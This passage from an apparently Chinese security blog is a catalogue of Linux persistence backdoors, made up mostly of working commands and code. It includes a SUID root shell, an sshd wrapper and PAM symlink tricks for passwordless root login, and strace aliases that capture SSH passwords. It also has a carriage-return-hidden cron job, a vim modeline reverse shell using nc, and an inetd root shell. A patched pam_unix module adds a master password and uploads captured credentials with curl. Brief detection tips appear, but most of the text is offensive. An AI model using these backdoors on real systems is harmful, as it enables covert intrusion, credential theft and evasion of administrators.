uid简称suid)时，且所属主为root时，当执行该文件时，其实是以root身份执行的。必要条件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、SUID权限仅对二进制程序有效。 </span><br><span class="line">2、执行者对于该程序需要具有x的可执行权限</span><br><span class="line">3、本权限仅在执行该程序的过程中有效  </span><br><span class="line">4、在执行过程中执行者将具有该程序拥有者的权限</span><br></pre></td></tr></table></figure><p>创建suid权限的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cp</span> /bin/bash /tmp/.woot</span><br><span class="line"><span class="variable">$chmod</span> 4755 /tmp/.woot</span><br><span class="line"><span class="variable">$ls</span> -al /.woot</span><br><span class="line">-rwsr-xr-x 1 root root 690668 Jul 24 17:14 .woot</span><br></pre></td></tr></table></figure><p>使用一般用户运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$/tmp/.woot </span><br><span class="line">$/tmp/.woot -p    //bash2 针对 suid 有一些护卫的措施，使用-p参数来获取一个root shell</span><br></pre></td></tr></table></figure><p>检测：查找具有suid权限的文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm +4000 -ls</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="LKM-Linux-rootkit后门"><a href="#LKM-Linux-rootkit后门" class="headerlink" title="LKM Linux rootkit后门"></a>LKM Linux rootkit后门</h3><p>项目地址:<a href="https://github.com/f0rb1dd3n/Reptile">https://github.com/f0rb1dd3n/Reptile</a></p><p>适用的系统:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Debian 9：4.9.0-8-amd64 </span><br><span class="line">Debian 10：4.19.0-8-amd64 </span><br><span class="line">Ubuntu 18.04.1 LTS：4.15.0-38-generic </span><br><span class="line">Kali Linux：4.18.0-kali2-amd64 </span><br><span class="line">Centos 6.10：2.6.32- 754.6.3.el6.x86_64 </span><br><span class="line">Centos 7：3.10.0-862.3.2.el7.x86_64 </span><br><span class="line">Centos 8：4.18.0-147.5.1.el8_1.x86_64</span><br></pre></td></tr></table></figure><h3 id="SSH-后门"><a href="#SSH-后门" class="headerlink" title="SSH 后门"></a>SSH 后门</h3><h4 id="1-SSH-wrapper"><a href="#1-SSH-wrapper" class="headerlink" title="1. SSH wrapper"></a>1. SSH wrapper</h4><p>判断连接来源端口，将恶意端口来源访问传输内容重定向到/bin/sh中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/usr/bin/perl&#x27;</span> &gt;sshd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd   //4A是13377的小端模式</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27;</span> &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line"></span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure><p>在本机执行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br></pre></td></tr></table></figure><p>实现原理：init 首先启动的是 /usr/sbin/sshd ,脚本执行到 getpeername  这里的时候，正则匹配会失败，于是执行下一句，启动 /usr/bin/sshd ，这是原始 sshd 。原始的 sshd 监听端口建立了 tcp  连接后，会 fork 一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的 /usr/sbin/sshd  ，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字， getpeername 能真的获取到客户端的 TCP 源端口，如果是  13377 就执行sh给个shell。</p><p>想要修改连接端口的话可以利用py修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,19526)</span><br><span class="line"><span class="built_in">print</span> repr(buffer)</span><br></pre></td></tr></table></figure><p>优点：<br> 1、在无连接后门的情况下，管理员是看不到端口和进程的，last也查不到登陆。<br> 2、在针对边界设备出网，内网linux服务器未出网的情况下，留这个后门可以随时管理内网linux服务器，还不会留下文件和恶意网络连接记录。</p><h4 id="2-SSH-软连接后门"><a href="#2-SSH-软连接后门" class="headerlink" title="2. SSH 软连接后门"></a>2. SSH 软连接后门</h4><p>软连接后门的原理是利用了PAM配置文件的作用，将sshd文件软连接名称设置为su，这样应用在启动过程中他会去PAM配置文件夹中寻找是否存在对应名称的配置信息(su)，然而 su 在 pam_rootok 只检测 uid 0 即可认证成功，这样就导致了可以使用任意密码登录:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su</span><br><span class="line">/tmp/su -oPort=888</span><br><span class="line"></span><br><span class="line">ssh root@127.0.0.1 -p 888</span><br></pre></td></tr></table></figure><p>优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成8081，8080等端口。</p><h4 id="3-SSH-公钥免密登陆"><a href="#3-SSH-公钥免密登陆" class="headerlink" title="3. SSH 公钥免密登陆"></a>3. SSH 公钥免密登陆</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa //生成公钥</span><br><span class="line"><span class="built_in">echo</span> id_rsa.pub &gt;&gt; .ssh/authorized_keys  //将id_rsa.pub内容放到目标.ssh/authorized_keys里</span><br></pre></td></tr></table></figure><p>这个是老生常谈的公钥免登陆，这种用法不只是用在留后门，还可以在一些特殊情况下获取一个交互的shell，如struts写入公钥，oracle写入公钥连接，Redis未授权访问等情景。</p><h4 id="4-SSH-Keylogger记录密码"><a href="#4-SSH-Keylogger记录密码" class="headerlink" title="4. SSH Keylogger记录密码"></a>4. SSH Keylogger记录密码</h4><p>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</p><p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ssh=<span class="string">&#x27;strace -o /tmp/.sshpwd-`date &#x27;</span>+%d%h%m%s<span class="string">&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span></span><br></pre></td></tr></table></figure><p>设置完毕后，倘若当前系统不存在alias，那么就会影响其正常使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;read(5&quot;</span> /tmp/.sshpwd-09May32324242.log | tail -n 11    //根据不同环境自行调试响应行数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/835775c8fa153d2af1fc59ec13601651530.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/835775c8fa153d2af1fc59ec13601651530.png" srcset="data:image/png;base64,666" alt="img"></p><h4 id="5-strace监听ssh来源流量"><a href="#5-strace监听ssh来源流量" class="headerlink" title="5. strace监听ssh来源流量"></a>5. strace监听ssh来源流量</h4><p>不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。</p><p>之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep sshd    //父进程PID</span><br><span class="line">strace -f -p 6419 -o /tmp/.ssh.log -e trace=<span class="built_in">read</span>,write,connect -s 2048</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/024d9e5006fd696bbe913b8c594961a8350.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/024d9e5006fd696bbe913b8c594961a8350.png" srcset="data:image/png;base64,666" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1775dd830da62bf35fe5165d66087909742.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1775dd830da62bf35fe5165d66087909742.png" srcset="data:image/png;base64,666" alt="img"></p><p>检测：查看shell的配置文件或者 alias 命令即可发现，例如 ~/.bashrc 或 ~/.zshrc 文件查看是否有恶意的 alias</p><h3 id="Cron后门"><a href="#Cron后门" class="headerlink" title="Cron后门"></a>Cron后门</h3><p>在Linux系统中，计划任务一般是由cron承担，我们可以把cron设置为开机时自动启动。cron启动后，它会读取它的所有配置文件（全局性配置文件/etc/crontab，以及每个用户的计划任务配置文件），然后cron会根据命令和执行时间来按时来调用工作任务。</p><p>cron表达式在线生成：<a href="http://qqe2.com/cron">http://qqe2.com/cron</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;echo &#39;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.elf;&#x2F;bin&#x2F;bash --noprofile -i&#39;)|crontab -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3150ad3f4881d2e188af61220d7ca9f3113.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3150ad3f4881d2e188af61220d7ca9f3113.png" srcset="data:image/png;base64,666" alt="img"></p><p>这样执行会在crontab列表里出现，如果是如上执行的话，管理员执行crontab -l就能看到执行的命令内容不是特别隐蔽。</p><p>那么就有了一个相对的高级用法，下面命令执行后会显示”no crontab for root”。其实就达到了一个隐藏的效果，这时候管理员如果执行 crontab -l 就会看到显示”no crontab for root”:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf &quot;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;1.elf;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/bf69160c7ad8187a1b7ab690b89cea58459.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/bf69160c7ad8187a1b7ab690b89cea58459.png" srcset="data:image/png;base64,666" alt="img"></p><p>实际上是他将 cron 文件写到文件中,而 crontab -l 就是列出了该文件的内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure><p>通常 cat 是看不到这个的，只能利用 less、vim 或者 cat -A 看到，这也是利用了cat的一个缺陷，在下一节会主要讲这个。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#这几个路径都可以存放cron执行脚本,对应的时间不同</span><br><span class="line">&#x2F;etc&#x2F;cron.d&#x2F; &#x2F;etc&#x2F;cron.daily&#x2F; &#x2F;etc&#x2F;cron.weekly&#x2F; &#x2F;etc&#x2F;cron.hourly&#x2F; &#x2F;etc&#x2F;cron.monthly&#x2F; </span><br></pre></td></tr></table></figure><h3 id="Cat隐藏"><a href="#Cat隐藏" class="headerlink" title="Cat隐藏"></a>Cat隐藏</h3><p>刚刚在cron里面提到了cat的一个缺陷，可以利用这个缺陷隐藏恶意命令在一些脚本中：这里的示例我就用 hiding-from-cats  里的例子吧。之所以单列出来，个人认为在一些大型企业的运维工具脚本中可以插入恶意代码，利用cat的缺陷还可以使管理员无法发现脚本被做手脚。</p><p>cat其实默认使用是支持一些比如 \r 回车符 \n 换行符 \f 换页符、也就是这些符号导致的能够隐藏命令。</p><p>使用python生成带有换行符的内容sh：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd_h &#x3D; &quot;echo &#39;You forgot to check &#96;cat -A&#96;!&#39; &gt; oops&quot; # hidden</span><br><span class="line">cmd_v &#x3D; &quot;echo &#39;Hello world!&#39;&quot;                         # visible</span><br><span class="line"></span><br><span class="line">with open(&quot;test.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">output &#x3D; &quot;#!&#x2F;bin&#x2F;sh\n&quot;</span><br><span class="line">output +&#x3D; cmd_h + &quot;;&quot; + cmd_v + &quot; #\r&quot; + cmd_v + &quot; &quot; * (len(cmd_h) + 3) + &quot;\n&quot;</span><br><span class="line">f.write(output)</span><br></pre></td></tr></table></figure><p>使用 py 生成了一个 test.sh 脚本，同目录下只有他本文件，cat查看一下：</p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6c2fc96f653ae7645649928fe1d64926384.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6c2fc96f653ae7645649928fe1d64926384.png" srcset="data:image/png;base64,666" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1f39081a91de5f4295e4179a0c50ed03440.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/1f39081a91de5f4295e4179a0c50ed03440.png" srcset="data:image/png;base64,666" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/feb10e961edcbad0e911dc94c130a973808.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/feb10e961edcbad0e911dc94c130a973808.png" srcset="data:image/png;base64,666" alt="img"></p><p>其实可以看出来这样就做到了恶意命令隐藏的效果。其实之前 Cron 后门中的隐藏方法就是利用了这个。如果使用 cat -A 查看root文件的话就可以看到计划任务的真正内容了。</p><h3 id="Vim后门"><a href="#Vim后门" class="headerlink" title="Vim后门"></a>Vim后门</h3><h4 id="1-vim-modeline-CVE-2019-12735"><a href="#1-vim-modeline-CVE-2019-12735" class="headerlink" title="1. vim modeline(CVE-2019-12735)"></a>1. vim modeline(CVE-2019-12735)</h4><p>该漏洞存在于编辑器的 modeline功能，部分 Linux 发行版默认启用了该功能，macOS 是没有默认启用。 当 vim  打开一个包含了 vim modeline 注释行的文件时，会自动读取这一行的参数配置并调整自己的设置到这个配置。vim默认关闭modeline。</p><p>开启命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.vimrc</span><br><span class="line">set modeline</span><br></pre></td></tr></table></figure><p>当前目录下创建文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;:!uname -a||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;&#39; &gt; hello.txt</span><br><span class="line">vim hello.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2f8b80a7e444680e8a5d12a8a164d9bc917.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2f8b80a7e444680e8a5d12a8a164d9bc917.png" srcset="data:image/png;base64,666" alt="img"></p><p>反弹shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:!rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 127.0.0.1 9999 &gt;&#x2F;tmp&#x2F;f||&quot; vi:fen:fdm&#x3D;expr:fde&#x3D;assert_fails(&quot;source\!\ \%&quot;):fdl&#x3D;0:fdt&#x3D;&quot;</span><br></pre></td></tr></table></figure><h4 id="2-vim-python-扩展后门"><a href="#2-vim-python-扩展后门" class="headerlink" title="2. vim python 扩展后门"></a>2. vim python 扩展后门</h4><p>适用于安装了vim且安装了python扩展(绝大版本默认安装)的linux系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</span><br></pre></td></tr></table></figure><p>恶意脚本 dir.py 的内容可以是任何功能的后门，比如监听本地的11端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#from https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PYTHON&#x2F;python-shell-backdoor.html</span><br><span class="line">from socket import *</span><br><span class="line">import subprocess</span><br><span class="line">import os, threading, sys, time</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">       server&#x3D;socket(AF_INET,SOCK_STREAM)</span><br><span class="line">       server.bind((&#39;0.0.0.0&#39;,11))</span><br><span class="line">       server.listen(5)</span><br><span class="line">       print &#39;waiting for connect&#39;</span><br><span class="line">       talk, addr &#x3D; server.accept()</span><br><span class="line">       print &#39;connect from&#39;,addr</span><br><span class="line">       proc &#x3D; subprocess.Popen([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;], stdin&#x3D;talk,</span><br><span class="line">               stdout&#x3D;talk, stderr&#x3D;talk, shell&#x3D;True)</span><br></pre></td></tr></table></figure><p>攻击机nc连接过去就可以了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup vim -E -c &quot;pyfile dir.py&quot;</span><br><span class="line">nc 127.0.0.1 11</span><br></pre></td></tr></table></figure><h3 id="inetd服务后门"><a href="#inetd服务后门" class="headerlink" title="inetd服务后门"></a>inetd服务后门</h3><p>inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。所以，如果我们已经在目标系统的inetd配置文件中配置好，那么来自外部的某个socket是要执行一个可交互的shell，就获取了一个后门。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#修改&#x2F;etc&#x2F;inetd.conf</span><br><span class="line">$vim &#x2F;etc&#x2F;inetd.conf</span><br><span class="line"></span><br><span class="line">#discard stream tcp nowait root internal </span><br><span class="line">#discard dgram udp wait root internal </span><br><span class="line">daytime stream tcp nowait root &#x2F;bin&#x2F;bash bash -i</span><br><span class="line"></span><br><span class="line">#开启inetd</span><br><span class="line">$inetd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#nc连接</span><br><span class="line">nc -vv 192.168.2.11 13</span><br><span class="line">#可以配合suid后门，修改&#x2F;etc&#x2F;services文件：</span><br><span class="line">suidshell 6666&#x2F;tcp</span><br><span class="line">#然后修改&#x2F;etc&#x2F;inetd.conf</span><br><span class="line">suidshell stream tcp nowait root &#x2F;bin&#x2F;bash bash -i</span><br><span class="line">#可以修改成一些常见的端口，以实现隐藏</span><br></pre></td></tr></table></figure><p>检测：查看配置文件即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;inetd.conf</span><br></pre></td></tr></table></figure><h3 id="协议后门"><a href="#协议后门" class="headerlink" title="协议后门"></a>协议后门</h3><p>在一些访问控制做的比较严格的环境中，由内到外的TCP流量会被阻断掉。但是对于UDP(DNS、ICMP)相关流量通常不会拦截。</p><h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><p>主要原理就是利用ICMP中可控的data字段进行数据传输，具体原理请参考: <a href="https://zhuanlan.zhihu.com/p/41154036">https://zhuanlan.zhihu.com/p/41154036</a></p><p>开源工具：ICMP后门项目地址：<a href="https://github.com/andreafabrizi/prism">https://github.com/andreafabrizi/prism</a></p><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>在大多数的网络里环境中IPS/IDS或者硬件防火墙都不会监控和过滤DNS流量。主要原理就是将后门载荷隐藏在拥有PTR记录和A记录的DNS域中（也可以利用AAAA记录和IPv6地址传输后门），具体请参考：<a href="https://www.anquanke.com/post/id/85431">通过DNS传输后门来绕过杀软</a></p><p>开源工具：DNS后门项目地址：<a href="https://github.com/DamonMohammadbagher/NativePayload_DNS">https://github.com/DamonMohammadbagher/NativePayload_DNS</a></p><p>协议后门检测：对于DNS/ICMP这种协议后门，直接查看网络连接即可，因为在使用过程中会产生大量的网络连接</p><p>清除：kill进程、删除文件即可</p><h3 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h3><p>PAM使用配置 /etc/pam.d/ 下的文件来管理认证方式，应用程序调用相应的配置文件，以加载动态库的形式调用 /lib/security下的模块。</p><p>PAM配置可分为四个参数: 模块类型、控制标记、模块路径、模块参数，例如: session required pam_selinux.so open</p><p>上面提到的 sshd 软链接后门利用的 PAM 机制达到任意密码登录，还有一种方式是键盘记录。原理主要是通过 pam_unix_auth.c 打补丁的方式潜入到正常的 pam 模块中，以此来记录管理员的帐号密码。</p><p>利用步骤：复制patch到源代码目录 &gt;&gt;&gt; 打patch &gt;&gt;&gt; 编译 &gt;&gt;&gt;  将生成的pam_uninx.so文件覆盖到/lib/secruity/pam_unix.so下 &gt;&gt;&gt; 修改文件属性  &gt;&gt;&gt; 建立密码保存文件，并设置好相关的权限 &gt;&gt;&gt; 清理日志 &gt;&gt;&gt; ok</p><p>1、查看pam版本并下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep pam</span><br><span class="line">pam-1.1.8-12.el7_1.1.x86_64</span><br><span class="line">http:&#x2F;&#x2F;www.linux-pam.org&#x2F;library&#x2F;</span><br><span class="line">curl -O http:&#x2F;&#x2F;www.linux-pam.org&#x2F;library&#x2F;Linux-PAM-1.1.8.tar.gz</span><br></pre></td></tr></table></figure><p>2、修改并编译pam_unix_auth.c文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Linux-PAM-1.1.8</span><br><span class="line">vim modules&#x2F;pam_unix&#x2F;pam_unix_auth.c</span><br></pre></td></tr></table></figure><p>3、pam_unix_auth.c 修改前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* verify the password of this user *&#x2F;</span><br><span class="line">    retval &#x3D; _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">    name &#x3D; p &#x3D; NULL;</span><br></pre></td></tr></table></figure><p>4、pam_unix_auth.c 修改后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* verify the password of this user *&#x2F;</span><br><span class="line">    retval &#x3D; _unix_verify_password(pamh, name, p, ctrl);</span><br><span class="line">    if(strcmp(p,&quot;1q2w3e4r&quot;)&#x3D;&#x3D;0)&#123;return PAM_SUCCESS;&#125;</span><br><span class="line">    if(retval &#x3D;&#x3D; PAM_SUCCESS)&#123;</span><br><span class="line">        FILE * fp;</span><br><span class="line">        fp &#x3D; fopen(&quot;&#x2F;bin&#x2F;.sshlog&quot;, &quot;a&quot;);</span><br><span class="line">        fprintf(fp, &quot;%s : %s\n&quot;, name, p);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        system(&quot;curl -H &#39;Max-Downloads: 0&#39; -H &#39;Max-Days: 7&#39; --upload-file &#x2F;bin&#x2F;.sshlog http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sshlog.txt -s -o &#x2F;dev&#x2F;null --connect-timeout 3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    name &#x3D; p &#x3D; NULL;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#39;Max-Downloads: 0&#39; -H &#39;Max-Days: 7&#39; --upload-file &#x2F;bin&#x2F;.sshlog http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sshlog.txt -s -o &#x2F;dev&#x2F;null --connect-timeout 3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译后：modules/pam_unix/.libs/pam_unix.so</p><p>5、备份/替换/修改时间戳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ll &#x2F;lib64&#x2F;security&#x2F;</span><br><span class="line">-rwxr-xr-x. 1 root root  57688 8月  18 2015 pam_unix.so</span><br><span class="line">-rwxr-xr-x. 1 root root  15384 8月  18 2015 pam_userdb.so</span><br><span class="line">-rwxr-xr-x. 1 root root   7000 8月  18 2015 pam_warn.so</span><br><span class="line">-rwxr-xr-x. 1 root root  11168 8月  18 2015 pam_wheel.so</span><br><span class="line">-rwxr-xr-x. 1 root root  19744 8月  18 2015 pam_xauth.so</span><br><span class="line">cp &#x2F;lib64&#x2F;security&#x2F;pam_unix.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.so.bak</span><br><span class="line">cp .&#x2F;pam_unix.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br><span class="line">touch -r &#x2F;lib64&#x2F;security&#x2F;pam_userdb.so &#x2F;lib64&#x2F;security&#x2F;pam_unix.so</span><br><span class="line">ll &#x2F;lib64&#x2F;security&#x2F;</span><br><span class="line">-rwxr-xr-x. 1 root root 221776 8月  18 2015 pam_unix.so</span><br><span class="line">-rwxr-xr-x. 1 root root  57688 6月  30 23:18 pam_unix.so.bak</span><br><span class="line">-rwxr-xr-x. 1 root root  15384 8月  18 2015 pam_userdb.so</span><br><span class="line">-rwxr-xr-x. 1 root root   7000 8月  18 2015 pam_warn.so</span><br><span class="line">-rwxr-xr-x. 1 root root  11168 8月  18 2015 pam_wheel.so</span><br><span class="line">-rwxr-xr-x. 1 root root  19744 8月  18 2015 